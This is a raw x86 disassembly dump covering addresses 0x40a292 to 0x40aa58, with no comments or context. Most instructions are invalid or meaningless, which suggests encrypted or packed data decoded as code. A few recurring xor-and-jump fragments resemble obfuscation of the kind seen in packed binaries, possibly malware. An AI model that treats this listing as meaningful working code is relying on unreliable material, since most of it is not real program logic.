  40a292:	(bad)  
  40a293:	mov    ah,0xde
  40a295:	mov    DWORD PTR [ebp+0x0],esp
  40a298:	add    BYTE PTR [ebx-0x31000000],bh
  40a29e:	add    bl,BYTE PTR [ebx+0x62b7016d]
  40a2a4:	pop    es
  40a2a5:	jecxz  0x40a2a5
  40a2a7:	or     al,0x26
  40a2a9:	xchg   edi,eax
  40a2aa:	push   cs
  40a2ab:	sbb    BYTE PTR [esi+0x7d],0x63
  40a2af:	inc    ebx
  40a2b0:	inc    ebp
  40a2b1:	inc    eax
  40a2b2:	mov    ah,0x43
  40a2b4:	push   edx
  40a2b5:	lods   al,BYTE PTR ds:[esi]
  40a2b6:	repz xor dh,BYTE PTR [edx+edx*8-0x6123e229]
  40a2be:	jo     0x40a2d8
  40a2c0:	int3   
  40a2c1:	and    bh,BYTE PTR [ecx+edi*4+0x38]
  40a2c5:	pop    ds
  40a2c6:	test   eax,0xd1182f55
  40a2cc:	dec    ecx
  40a2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2ce:	adc    bh,BYTE PTR [esi+0x64]
  40a2d1:	in     eax,0x8
  40a2d3:	and    BYTE PTR [ebp-0x5311d212],dl
  40a2d9:	(bad)  
  40a2da:	push   0x41b1643c
  40a2df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2e0:	push   edi
  40a2e1:	daa    
  40a2e2:	dec    esi
  40a2e3:	mov    ds:0x8d5f34cc,eax
  40a2e8:	ja     0x40a289
  40a2ea:	fadd   QWORD PTR [edx+0x2d5284d6]
  40a2f0:	add    DWORD PTR [eax+ebp*8-0x3a6fc24e],0x0
  40a2f8:	fild   QWORD PTR [esi+ebp*4]
  40a2fb:	xchg   edx,eax
  40a2fc:	mov    esi,0xd10978c4
  40a301:	jbe    0x40a287
  40a303:	xchg   ebp,eax
  40a304:	hlt    
  40a305:	sub    al,0x5d
  40a307:	fs sti 
  40a309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a30a:	or     ah,BYTE PTR [ecx+0x6b645fff]
  40a310:	je     0x40a2fd
  40a312:	inc    edi
  40a313:	dec    ecx
  40a314:	jno    0x40a340
  40a316:	dec    edx
  40a317:	mov    ebx,0x3dcf0c8d
  40a31c:	pop    ebx
  40a31d:	rcl    cl,1
  40a31f:	or     BYTE PTR [ebp-0x4468db51],dh
  40a325:	mov    fs,WORD PTR [ebp-0x4d8be412]
  40a32b:	jb     0x40a2bc
  40a32d:	sub    ah,BYTE PTR [edi+0x39dbadcb]
  40a333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a334:	adc    eax,0xbf61c239
  40a339:	je     0x40a2f0
  40a33b:	adc    esp,DWORD PTR [edi+ecx*4+0x6296543e]
  40a342:	push   esi
  40a343:	mov    ds:0xf78c5dda,eax
  40a348:	sub    DWORD PTR [ebp-0x67dd8a76],eax
  40a34e:	pop    esi
  40a34f:	add    eax,esp
  40a351:	mov    bh,0x10
  40a353:	xchg   esi,eax
  40a354:	push   edx
  40a355:	mov    ds:0x5789b556,eax
  40a35a:	add    al,0x8b
  40a35c:	pop    es
  40a35d:	mov    edx,DWORD PTR [edi+0x4]
  40a360:	xor    edx,ebx
  40a362:	xor    eax,esi
  40a364:	add    eax,0x99b8624d
  40a369:	adc    edx,0x8ddc
  40a36f:	mov    DWORD PTR [ebp+0x8],eax
  40a372:	jmp    0x40a44a
  40a377:	xlat   BYTE PTR ds:[ebx]
  40a378:	pushf  
  40a379:	sbb    ebx,eax
  40a37b:	pop    ebx
  40a37c:	(bad)  
  40a37e:	lahf   
  40a37f:	test   eax,0x40de28f3
  40a384:	aam    0xc3
  40a386:	dec    esi
  40a387:	inc    esp
  40a388:	data16 add BYTE PTR [eax],al
  40a38b:	mov    ebx,0x1d000000
  40a390:	mov    edi,0x5f160dd8
  40a395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a396:	loope  0x40a380
  40a398:	stc    
  40a399:	(bad)  
  40a39a:	out    dx,al
  40a39b:	xor    esi,DWORD PTR [edx-0x6f45ad18]
  40a3a1:	xor    BYTE PTR [esi+0x24],0x83
  40a3a5:	mov    ds:0x635cb39d,eax
  40a3aa:	pop    ebx
  40a3ab:	dec    edi
  40a3ac:	inc    edi
  40a3ad:	cmp    ah,BYTE PTR [esi]
  40a3af:	ror    BYTE PTR [esi-0x6817ea51],cl
  40a3b5:	inc    esp
  40a3b6:	and    al,0x53
  40a3b8:	(bad)  
  40a3ba:	int3   
  40a3bb:	iret   
  40a3bc:	pop    ds
  40a3bd:	fmul   QWORD PTR [ecx+0xa7ab818]
  40a3c3:	lea    ecx,[esi+0x23]
  40a3c6:	sar    ch,1
  40a3c8:	mov    edx,0x187be642
  40a3cd:	repnz hlt 
  40a3cf:	call   0x656c:0x11e8b5a2
  40a3d6:	or     BYTE PTR [ebx+0x7f],cl
  40a3d9:	xor    eax,esp
  40a3db:	cmp    eax,0x366c7262
  40a3e0:	popa   
  40a3e1:	scas   eax,DWORD PTR es:[edi]
  40a3e2:	shl    esp,cl
  40a3e4:	and    DWORD PTR [eax+eax*8-0x189f7e29],esi
  40a3eb:	cld    
  40a3ec:	push   ecx
  40a3ed:	fld    TBYTE PTR [ebp+0x3a0baf91]
  40a3f3:	ds mov edi,0x9069c7b0
  40a3f9:	das    
  40a3fa:	std    
  40a3fb:	or     esp,DWORD PTR [ebx-0x7c]
  40a3fe:	es mov ch,0x6b
  40a401:	dec    esp
  40a402:	call   0x290fbb8c
  40a407:	imul   ecx,edx,0x2
  40a40a:	enter  0xfbba,0xb8
  40a40e:	pushf  
  40a40f:	(bad)  
  40a411:	jo     0x40a464
  40a413:	pushf  
  40a414:	push   edi
  40a415:	mov    esi,0x6b96246a
  40a41a:	stos   DWORD PTR es:[edi],eax
  40a41b:	or     eax,0xea835d55
  40a420:	ja     0x40a478
  40a422:	pop    esp
  40a423:	pop    esp
  40a424:	jae    0x40a3e5
  40a426:	inc    edx
  40a427:	aas    
  40a428:	lods   al,BYTE PTR ds:[esi]
  40a429:	retf   
  40a42a:	ficomp WORD PTR [ebx-0x235b358d]
  40a430:	mov    ch,BYTE PTR [esi-0x2f]
  40a433:	sub    BYTE PTR [edi-0x58d2415],dl
  40a439:	mov    DWORD PTR [edx+0x7af4e348],ecx
  40a43f:	jecxz  0x40a3fe
  40a441:	cli    
  40a442:	jnp    0x40a437
  40a444:	(bad)  
  40a445:	loope  0x40a47e
  40a447:	test   al,0x72
  40a449:	lea    ecx,[ebx+0xc558901]
  40a44f:	mov    edx,DWORD PTR [ecx+0x4]
  40a452:	jmp    0x40a52a
  40a457:	mov    ds,WORD PTR cs:[ecx-0x10884690]
  40a45e:	ficomp WORD PTR [esi+0x4b]
  40a461:	aaa    
  40a462:	jo     0x40a3ec
  40a464:	int    0x2d
  40a466:	imul   edi,edi,0xbb000066
  40a46c:	add    BYTE PTR [eax],al
  40a46e:	add    BYTE PTR [ebx],bl
  40a470:	xchg   DWORD PTR [edi+ebp*1],ecx
  40a473:	mov    eax,ds:0x187fa965
  40a478:	jnp    0x40a4f1
  40a47a:	fisubr WORD PTR ss:[ebx+ecx*1]
  40a47e:	cmp    edx,edi
  40a480:	shr    DWORD PTR [edx],cl
  40a482:	and    bl,0x10
  40a485:	scas   al,BYTE PTR es:[edi]
  40a486:	add    DWORD PTR [edi-0x3e3e92d9],ebx
  40a48c:	rol    ebx,cl
  40a48e:	imul   esp,DWORD PTR [edi-0x1b],0x3dc1752d
  40a495:	repz aam 0x7a
  40a498:	in     eax,dx
  40a499:	arpl   WORD PTR [ebx+0x3e],cx
  40a49c:	cwde   
  40a49d:	mov    ebx,0xcd4aeabd
  40a4a2:	and    al,BYTE PTR [ecx]
  40a4a4:	scas   al,BYTE PTR es:[edi]
  40a4a5:	jl     0x40a427
  40a4a7:	sbb    cl,BYTE PTR es:[eax-0x30]
  40a4ab:	fcomp  DWORD PTR [esi-0x34]
  40a4ae:	adc    eax,0x988c50a4
  40a4b3:	push   cs
  40a4b4:	test   eax,0x3b2d7477
  40a4b9:	pop    ebp
  40a4ba:	mov    edx,0x14dac5aa
  40a4bf:	inc    ebp
  40a4c0:	inc    eax
  40a4c1:	adc    DWORD PTR [eax-0x62605a3e],ecx
  40a4c7:	adc    ecx,esp
  40a4c9:	xchg   esi,eax
  40a4ca:	pop    ss
  40a4cb:	cmc    
  40a4cc:	outs   dx,BYTE PTR ds:[esi]
  40a4cd:	push   ebp
  40a4ce:	sbb    edi,ebp
  40a4d0:	pop    edx
  40a4d1:	sub    eax,0x8253775b
  40a4d6:	pusha  
  40a4d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4d8:	pop    ecx
  40a4d9:	mov    esp,0x6a800883
  40a4de:	imul   eax,DWORD PTR [ebx-0x4c],0x43707c01
  40a4e5:	in     al,dx
  40a4e6:	int3   
  40a4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4e8:	adc    esp,edx
  40a4ea:	push   es
  40a4eb:	mov    ch,0x78
  40a4ed:	jb     0x40a4a3
  40a4ef:	aam    0x3b
  40a4f1:	cmp    BYTE PTR [esi],cl
  40a4f3:	test   eax,0x243f22a7
  40a4f8:	out    dx,eax
  40a4f9:	jns    0x40a492
  40a4fb:	adc    DWORD PTR [eax+0x1b],0x28
  40a4ff:	xor    bh,BYTE PTR [esi]
  40a501:	into   
  40a502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a503:	xchg   DWORD PTR [edi],esi
  40a505:	jbe    0x40a54d
  40a507:	(bad)
  40a50a:	call   0xab34b6c8
  40a50f:	xchg   ebp,eax
  40a510:	push   0xfdc360ad
  40a515:	call   0x39b0:0xf6c3edf1
  40a51c:	fistp  WORD PTR [esi-0x61aed96e]
  40a522:	mov    esi,0x7abc561d
  40a527:	sbb    eax,0xc633ebae
  40a52c:	jmp    0x40a604
  40a531:	jge    0x9fdb4451
  40a537:	(bad)  
  40a538:	popf   
  40a539:	push   esi
  40a53a:	out    0x25,al
  40a53c:	imul   eax,DWORD PTR [edx-0x453cfcae],0xbb000067
  40a546:	add    BYTE PTR [eax],al
  40a548:	add    BYTE PTR [ebp-0x2def3410],ah
  40a54e:	(bad)  
  40a54f:	stos   BYTE PTR es:[edi],al
  40a550:	and    eax,0xd573b86
  40a555:	test   DWORD PTR [edi-0x3f66af70],esp
  40a55b:	stos   BYTE PTR es:[edi],al
  40a55c:	sbb    BYTE PTR [edx-0x27120d79],al
  40a562:	fdivr  DWORD PTR [edi]
  40a564:	mov    bl,0x45
  40a566:	fimul  WORD PTR [ebx+0x4e951a24]
  40a56c:	enter  0xdd6,0x6b
  40a570:	sbb    DWORD PTR [edi],esp
  40a572:	(bad)  
  40a573:	dec    edi
  40a574:	xor    DWORD PTR [edx],edi
  40a576:	jne    0x40a5e0
  40a578:	loop   0x40a55b
  40a57a:	add    DWORD PTR [edi+ebp*1],edi
  40a57d:	out    0x94,al
  40a57f:	ret    0xbefb
  40a582:	not    BYTE PTR [ebx-0x1e]
  40a585:	test   eax,0x76e4651b
  40a58a:	popf   
  40a58b:	mov    edi,0x5be56896
  40a590:	mov    esi,0xf6588475
  40a595:	gs cmc 
  40a597:	xchg   ecx,eax
  40a598:	repz mov al,BYTE PTR [eax+0x3d]
  40a59c:	jne    0x40a5e4
  40a59e:	fild   QWORD PTR [edx+0xd825552]
  40a5a4:	jg     0x40a52e
  40a5a6:	xchg   ecx,eax
  40a5a7:	pop    ss
  40a5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5a9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5ab:	mov    ds:0x49db980c,al
  40a5b0:	mov    cs,eax
  40a5b2:	into   
  40a5b3:	repz aam 0x7d
  40a5b6:	leave  
  40a5b7:	push   es
  40a5b8:	mov    ds:0xfe7b7c24,al
  40a5bd:	mov    WORD PTR [ebp-0x38],gs
  40a5c0:	mov    dx,0x4b95
  40a5c4:	pushf  
  40a5c5:	push   ebx
  40a5c6:	dec    ecx
  40a5c7:	jmp    0x40a58e
  40a5c9:	xor    ebp,edi
  40a5cb:	add    ch,BYTE PTR [ebx-0x71]
  40a5ce:	inc    ebx
  40a5cf:	pop    ss
  40a5d0:	sbb    BYTE PTR [edi-0x64],0x1b
  40a5d4:	cs hlt 
  40a5d6:	mov    DWORD PTR [edi],ebx
  40a5d8:	(bad)  
  40a5d9:	jle    0x40a5a7
  40a5db:	cmp    BYTE PTR [ecx],dl
  40a5dd:	sti    
  40a5de:	mov    edx,0xb1c2f903
  40a5e3:	je     0x40a630
  40a5e5:	mov    ebx,0xc587a00c
  40a5ea:	ins    DWORD PTR es:[edi],dx
  40a5eb:	jle    0x40a650
  40a5ed:	inc    esp
  40a5ef:	nop
  40a5f0:	ins    DWORD PTR es:[edi],dx
  40a5f1:	ins    BYTE PTR es:[edi],dx
  40a5f2:	(bad)  [edi+0xe08d97]
  40a5f8:	push   0xffffffaa
  40a5fa:	imul   ecx,DWORD PTR [edi+ecx*4-0x69],0x37
  40a5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a600:	push   eax
  40a601:	inc    ebp
  40a602:	inc    ebp
  40a603:	and    al,0x33
  40a605:	shr    ecx,cl
  40a607:	rol    DWORD PTR [eax],cl
  40a609:	add    BYTE PTR [eax],al
  40a60b:	les    ebp,FWORD PTR [ebp-0x4a025a63]
  40a611:	cld    
  40a612:	in     eax,dx
  40a613:	sub    dl,BYTE PTR [ebx]
  40a615:	ror    DWORD PTR [edi],cl
  40a617:	addr16 ds xor ah,ah
  40a61b:	jne    0x40a685
  40a61d:	add    BYTE PTR [eax],al
  40a61f:	mov    ebx,0x5e000000
  40a624:	mov    esi,0x80843d4e
  40a629:	sbb    edx,eax
  40a62b:	sub    ebp,DWORD PTR [esi+0x5f]
  40a62e:	stc    
  40a62f:	pop    edx
  40a630:	dec    eax
  40a631:	mov    ah,0x5
  40a633:	push   0x64
  40a635:	fld    st(7)
  40a637:	adc    bl,bh
  40a639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a63a:	dec    esp
  40a63b:	add    esp,DWORD PTR [esi+ecx*8-0x67]
  40a63f:	rcr    DWORD PTR [ebx],cl
  40a641:	das    
  40a642:	ret    
  40a643:	in     al,0x1b
  40a645:	jno    0x40a62d
  40a647:	pop    edi
  40a648:	push   ebx
  40a649:	fmul   QWORD PTR [edx+0x5a1bf6e8]
  40a64f:	inc    ebx
  40a650:	test   al,0xda
  40a652:	xchg   edi,eax
  40a653:	xchg   al,ch
  40a655:	jnp    0x40a626
  40a657:	add    BYTE PTR [eax+0x45],0xa7
  40a65b:	stos   BYTE PTR es:[edi],al
  40a65c:	sbb    BYTE PTR [ecx+0x6314c65a],0xdf
  40a663:	stos   DWORD PTR es:[edi],eax
  40a664:	pop    edx
  40a665:	mov    edx,0xc6847a50
  40a66a:	pop    edi
  40a66b:	push   ebx
  40a66c:	retf   0x2d2
  40a66f:	hlt    
  40a670:	xadd   BYTE PTR [eax+0x0],bl
  40a674:	xor    DWORD PTR [esi+0x96efbd0],esi
  40a67a:	mov    al,ds:0x58707996
  40a67f:	dec    edx
  40a680:	rcr    ecx,cl
  40a682:	fwait
  40a683:	(bad)  
  40a684:	mov    esi,0x9776eb9d
  40a689:	cmp    edi,eax
  40a68b:	ret    
  40a68c:	call   0x45bf166d
  40a691:	fwait
  40a692:	mov    ds:0x4fabb013,al
  40a697:	hlt    
  40a698:	ret    0x1f72
  40a69b:	sar    BYTE PTR [edx-0x57cd113f],1
  40a6a1:	lock dec ebx
  40a6a3:	std    
  40a6a4:	(bad)  
  40a6a5:	ficomp WORD PTR [eax-0xaece0b2]
  40a6ab:	push   0x91195171
  40a6b0:	inc    esi
  40a6b1:	pop    ebx
  40a6b2:	fnstcw WORD PTR [edi-0x7]
  40a6b5:	xor    ebx,edx
  40a6b7:	fwait
  40a6b8:	dec    eax
  40a6b9:	call   0x58fdc757
  40a6be:	mov    ecx,ecx
  40a6c0:	jmp    0x2cf7:0xc54cdb0e
  40a6c7:	mov    ecx,ebx
  40a6c9:	popa   
  40a6ca:	ds imul esp,ebx,0xc8783332
  40a6d1:	mov    eax,ds:0xb5b5d04b
  40a6d6:	jb     0x40a70c
  40a6d8:	test   DWORD PTR [edx+0x3b],esi
  40a6db:	sub    bh,0x8b
  40a6de:	add    eax,0x99b8624d
  40a6e3:	jmp    0x40a7bb
  40a6e8:	daa    
  40a6e9:	inc    DWORD PTR [ecx-0x88026ab]
  40a6ef:	dec    DWORD PTR [esi]
  40a6f1:	mov    WORD PTR [ebp+ecx*8+0x6de64cfa],?
  40a6f8:	xor    BYTE PTR [ecx+0x0],ch
  40a6fb:	add    BYTE PTR [ebx-0x6f000000],bh
  40a701:	add    DWORD PTR [edx-0x11526ef0],esp
  40a707:	ds fsubrp st(3),st
  40a70a:	dec    esi
  40a70b:	stos   BYTE PTR es:[edi],al
  40a70c:	ds mov bh,0xa0
  40a70f:	cmp    esi,DWORD PTR [edi-0x13]
  40a712:	ins    DWORD PTR es:[edi],dx
  40a713:	cmp    ebp,DWORD PTR [eax+0x288d7a33]
  40a719:	test   al,0xe0
  40a71b:	iret   
  40a71c:	ss adc eax,0xd5107247
  40a722:	jae    0x40a732
  40a724:	sub    ebp,DWORD PTR [esi-0x35]
  40a727:	sbb    DWORD PTR [ebx],eax
  40a729:	mov    al,0xeb
  40a72b:	cmp    ebp,ebp
  40a72d:	pop    ebp
  40a72e:	mov    ecx,0x81f85f37
  40a733:	mov    dh,bl
  40a735:	push   esi
  40a736:	add    DWORD PTR [esp+eax*1],ebp
  40a739:	mov    bh,0xd9
  40a73b:	ja     0x40a742
  40a73d:	pop    ebx
  40a73e:	(bad)  
  40a73f:	dec    edi
  40a740:	sub    al,0x81
  40a742:	and    eax,0x96c3be8
  40a747:	cwde   
  40a748:	mov    ah,0x11
  40a74a:	push   0x75fdb01b
  40a74f:	and    cl,al
  40a751:	pop    ds
  40a752:	(bad)  
  40a753:	outs   dx,BYTE PTR ds:[esi]
  40a754:	cmp    BYTE PTR [edi+0x926f017],cl
  40a75a:	lods   al,BYTE PTR ds:[esi]
  40a75b:	arpl   WORD PTR [esi-0x5c],si
  40a75e:	lds    ebx,FWORD PTR [esi]
  40a760:	or     BYTE PTR [ecx],dh
  40a762:	stos   DWORD PTR es:[edi],eax
  40a763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a764:	in     eax,0x1e
  40a766:	aad    0x7c
  40a768:	sbb    BYTE PTR [ecx-0x6],0x91
  40a76c:	mov    esp,DWORD PTR [eax-0x32]
  40a76f:	mov    ch,0x38
  40a771:	mov    eax,ds:0x599622e
  40a776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a777:	dec    ecx
  40a778:	scas   al,BYTE PTR es:[edi]
  40a779:	jae    0x40a6fe
  40a77b:	jmp    0x40a72f
  40a77d:	mul    BYTE PTR [ecx+edi*2-0x62251d5]
  40a784:	adc    BYTE PTR [ecx],ah
  40a786:	test   al,0x4a
  40a788:	and    dh,BYTE PTR ds:0xc2751d53
  40a78e:	dec    edi
  40a78f:	adc    BYTE PTR ds:0xb74e8978,0x28
  40a796:	mov    ds:0x5682498c,al
  40a79b:	mov    ds:0x7a76ea09,al
  40a7a0:	pop    ss
  40a7a1:	adc    esp,edi
  40a7a3:	adc    BYTE PTR [eax],0xaf
  40a7a6:	test   al,0x69
  40a7a8:	adc    ah,BYTE PTR [esi-0x7d]
  40a7ab:	jb     0x40a79d
  40a7ad:	lahf   
  40a7ae:	mov    cl,0xdf
  40a7b0:	cmp    bh,cl
  40a7b2:	push   0x1d
  40a7b4:	mov    edx,0x3736dfe7
  40a7b9:	push   ebp
  40a7ba:	loope  0x40a73d
  40a7bc:	rcr    ah,cl
  40a7be:	lea    eax,[eax]
  40a7c0:	add    cl,ch
  40a7c2:	rol    DWORD PTR [eax],cl
  40a7c4:	add    BYTE PTR [eax],al
  40a7c6:	aaa    
  40a7c7:	adc    al,0x4d
  40a7c9:	xchg   esi,eax
  40a7ca:	outs   dx,DWORD PTR ds:[esi]
  40a7cb:	(bad)  
  40a7cd:	mov    ch,0x45
  40a7cf:	sti    
  40a7d0:	mov    ecx,0xee4a002
  40a7d5:	add    ch,bl
  40a7d7:	imul   eax,DWORD PTR [eax],0xbb00
  40a7dd:	add    BYTE PTR [edx+0x29],ch
  40a7e0:	ins    DWORD PTR es:[edi],dx
  40a7e1:	popa   
  40a7e2:	inc    esi
  40a7e3:	(bad)  
  40a7e5:	jns    0x40a7e4
  40a7e7:	jge    0x40a816
  40a7e9:	shl    DWORD PTR [ecx],1
  40a7eb:	dec    edi
  40a7ec:	sub    dh,BYTE PTR [ebp+0x7f]
  40a7ef:	shl    DWORD PTR [ecx+ebp*4+0x77579534],cl
  40a7f6:	adc    ah,BYTE PTR [esi]
  40a7f8:	dec    eax
  40a7f9:	adc    al,0x51
  40a7fb:	jns    0x40a80b
  40a7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7fe:	div    cl
  40a800:	pop    esp
  40a801:	or     DWORD PTR [ebx-0x56],0x12
  40a805:	ja     0x40a83a
  40a807:	sti    
  40a808:	or     eax,0x3ccf46
  40a80d:	push   edx
  40a80e:	call   0x3a64:0xf1a2b968
  40a815:	sbb    eax,0x4bb67561
  40a81a:	or     edx,DWORD PTR [edx]
  40a81c:	pop    ecx
  40a81d:	aam    0x56
  40a81f:	mov    ebx,0xedba426
  40a824:	jp     0x40a82b
  40a826:	cmp    ebx,DWORD PTR [esi+0xefc7479]
  40a82c:	cmp    ebx,eax
  40a82e:	mov    edx,ebx
  40a830:	jl     0x40a85f
  40a832:	cld    
  40a833:	ins    BYTE PTR es:[edi],dx
  40a834:	adc    ah,BYTE PTR ds:[ecx-0x49]
  40a838:	and    DWORD PTR [ecx],0x62
  40a83b:	add    eax,0xb03f77f8
  40a840:	leave  
  40a841:	dec    ebx
  40a842:	mov    BYTE PTR [eax-0x41f5c24a],bh
  40a848:	sub    dl,BYTE PTR [eax-0x5d]
  40a84b:	sbb    BYTE PTR [eax],0x9f
  40a84e:	inc    esp
  40a84f:	cwde   
  40a850:	shl    BYTE PTR [ebp+0xccaf711],0xba
  40a857:	cwde   
  40a858:	in     eax,0xdf
  40a85a:	stos   BYTE PTR es:[edi],al
  40a85b:	or     eax,0xf904827
  40a860:	cmp    DWORD PTR [edi+0x25],ecx
  40a863:	mov    ds:0xc7ff89d0,eax
  40a868:	pop    eax
  40a869:	and    al,0x5d
  40a86b:	ins    DWORD PTR es:[edi],dx
  40a86c:	dec    esi
  40a86d:	aam    0x18
  40a86f:	imul   edi,DWORD PTR [ecx-0x59],0x8067d4db
  40a876:	mov    eax,0x2534d451
  40a87b:	or     ah,0x49
  40a87e:	jl     0x40a81e
  40a880:	(bad)  ds:0x9e808bff
  40a886:	loop   0x40a80a
  40a888:	jle    0x40a855
  40a88a:	mov    ah,0x6d
  40a88c:	push   cs
  40a88d:	jmp    0xf63160c6
  40a892:	adc    eax,0x9bf113c8
  40a897:	and    eax,0x84539df
  40a89c:	jmp    0x40a974
  40a8a1:	adc    edx,0xffffffdb
  40a8a4:	sub    bl,bl
  40a8a6:	sub    ebx,esi
  40a8a8:	sti    
  40a8a9:	cwde   
  40a8aa:	or     ah,dl
  40a8ac:	int3   
  40a8ad:	jbe    0x40a868
  40a8af:	neg    BYTE PTR [edi-0x5a]
  40a8b2:	push   0x0
  40a8b4:	add    BYTE PTR [ebx+0x3c000000],bh
  40a8ba:	cld    
  40a8bb:	and    eax,0xc052e360
  40a8c0:	das    
  40a8c1:	fimul  WORD PTR [ebx-0x1328b402]
  40a8c7:	sbb    BYTE PTR [ebx],ch
  40a8c9:	int3   
  40a8ca:	call   0xa75399c9
  40a8cf:	mov    cl,0x9b
  40a8d1:	hlt    
  40a8d2:	inc    edx
  40a8d3:	push   ebp
  40a8d4:	or     al,0x5a
  40a8d6:	jae    0x40a8a5
  40a8d8:	add    ebx,DWORD PTR [ebp*8+0x43a672ba]
  40a8df:	sub    esp,DWORD PTR [ebx-0x4d]
  40a8e2:	adc    DWORD PTR [edi+edx*2+0x720b58e5],ebx
  40a8e9:	mov    bh,0x5e
  40a8eb:	gs (bad) 
  40a8ed:	fidiv  DWORD PTR cs:[ecx]
  40a8f0:	push   ds
  40a8f1:	inc    esi
  40a8f2:	shl    DWORD PTR [ebx],0xd3
  40a8f5:	cmc    
  40a8f6:	stos   DWORD PTR es:[edi],eax
  40a8f7:	dec    ecx
  40a8f8:	pop    esp
  40a8f9:	and    al,0xa
  40a8fb:	ficom  WORD PTR [ebp-0x21ca85e]
  40a901:	sbb    al,0x9d
  40a903:	jb     0x40a974
  40a905:	mov    ebp,0xfdc7ac58
  40a90a:	and    BYTE PTR [esi],0xae
  40a90d:	xor    bl,BYTE PTR [edi-0x58]
  40a910:	rcr    BYTE PTR [edi+0x24],cl
  40a913:	inc    ebx
  40a914:	sbb    al,0xfa
  40a916:	ret    
  40a917:	inc    eax
  40a918:	jno    0x40a8c6
  40a91a:	outs   dx,DWORD PTR ds:[esi]
  40a91b:	ins    BYTE PTR es:[edi],dx
  40a91c:	mov    DWORD PTR [esi+0x59f0d66d],ecx
  40a922:	sbb    BYTE PTR [ecx+0x56],ah
  40a925:	shl    DWORD PTR [esi-0x4f],0xd5
  40a929:	loope  0x40a90e
  40a92b:	(bad)  
  40a92c:	std    
  40a92d:	sbb    edi,edx
  40a92f:	out    0x27,eax
  40a931:	(bad)  
  40a932:	jg     0x40a947
  40a934:	pusha  
  40a935:	gs aas 
  40a937:	xchg   cx,ax
  40a939:	jns    0x40a8db
  40a93b:	inc    edx
  40a93c:	sbb    BYTE PTR [edx-0x19],ah
  40a93f:	nop
  40a940:	test   eax,0x89b80eba
  40a945:	call   0x7ded:0x82fb57cd
  40a94c:	mov    al,0xd2
  40a94e:	arpl   WORD PTR [ecx-0x50f1fb13],bp
  40a954:	pop    ss
  40a955:	aaa    
  40a956:	test   eax,0x510aa417
  40a95b:	sub    bl,BYTE PTR [edi+0x309f9bb4]
  40a961:	ret    0xbed9
  40a964:	push   ebx
  40a965:	sub    ch,ah
  40a967:	and    BYTE PTR [edx-0x11e2d0d4],ah
  40a96d:	mov    eax,0x660b657c
  40a972:	ds inc edi
  40a974:	jne    0x40aa5b
  40a97a:	cmp    DWORD PTR [ebp+0xc],edx
  40a97d:	je     0x40ab43
  40a983:	jmp    0x40aa5b
  40a988:	cli    
  40a989:	or     eax,0xe3ff608e
  40a98e:	(bad)  
  40a98f:	lahf   
  40a990:	lahf   
  40a991:	add    al,0x19
  40a993:	ficomp WORD PTR [ecx+0x6102952b]
  40a999:	imul   eax,DWORD PTR [eax],0x0
  40a99c:	mov    ebx,0x98000000
  40a9a1:	les    edi,FWORD PTR [ebp+edx*4+0x374fb3f3]
  40a9a8:	shr    DWORD PTR [esi-0x55],0xcb
  40a9ac:	jns    0x40a970
  40a9ae:	shr    al,1
  40a9b0:	push   0xffffffb3
  40a9b2:	mov    ss,WORD PTR [ecx]
  40a9b4:	mov    bh,0x9b
  40a9b6:	enter  0xc7f8,0x80
  40a9ba:	bound  edx,QWORD PTR [ebp-0x72]
  40a9bd:	shl    DWORD PTR [edi-0x50],1
  40a9c0:	pop    es
  40a9c1:	pop    eax
  40a9c2:	and    eax,DWORD PTR [esi-0x4edc61d9]
  40a9c8:	xchg   ecx,eax
  40a9c9:	mov    ?,WORD PTR [edi+0x2a]
  40a9cc:	sub    DWORD PTR [ecx-0x44eee379],ecx
  40a9d2:	push   cs
  40a9d3:	(bad)  
  40a9d4:	daa    
  40a9d5:	and    ch,bh
  40a9d7:	out    dx,al
  40a9d8:	jne    0x40a95f
  40a9da:	in     eax,0xa7
  40a9dc:	es jmp 0x80f81ba2
  40a9e2:	mov    DWORD PTR [edx-0x1],eax
  40a9e5:	sbb    al,0xef
  40a9e7:	fmul   QWORD PTR [edi]
  40a9e9:	mov    dl,0xf0
  40a9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9ec:	das    
  40a9ed:	data16 aaa 
  40a9ef:	data16 hlt 
  40a9f1:	hlt    
  40a9f2:	mov    edx,0xb5f679e6
  40a9f7:	sbb    ah,BYTE PTR [esp+ebx*8-0x4e8f3b25]
  40a9fe:	jl     0x40aa5a
  40aa00:	je     0x40aa5b
  40aa02:	push   0xa910466b
  40aa07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa08:	mov    ds:0x5255b369,al
  40aa0d:	fistp  WORD PTR [edx+0x67]
  40aa10:	dec    edi
  40aa11:	imul   esp,DWORD PTR [ecx+0x2d],0x2587a554
  40aa18:	push   0x9703b058
  40aa1d:	lock out 0xef,eax
  40aa20:	inc    ebx
  40aa21:	jb     0x40a9b1
  40aa23:	pop    ecx
  40aa24:	and    al,BYTE PTR [edx]
  40aa26:	into   
  40aa27:	imul   eax,DWORD PTR [eax],0xd13bab51
  40aa2d:	sub    BYTE PTR ds:0xfc829bff,dh
  40aa33:	rcl    ebp,1
  40aa35:	xchg   ebx,eax
  40aa36:	xchg   esp,esp
  40aa38:	das    
  40aa39:	setp   BYTE PTR [ecx+0x3]
  40aa3d:	and    DWORD PTR [eax],ebp
  40aa3f:	jne    0x40a9e2
  40aa41:	or     bh,al
  40aa43:	push   eax
  40aa44:	mov    ds:0x5254c731,al
  40aa49:	sub    dl,BYTE PTR [eax+0x67]
  40aa4c:	xor    edi,ebp
  40aa4e:	and    edx,DWORD PTR [eax+ebp*2-0x4676047]
  40aa55:	lea    esp,[ebx]
  40aa57:	std    
  40aa58:	pop    ds
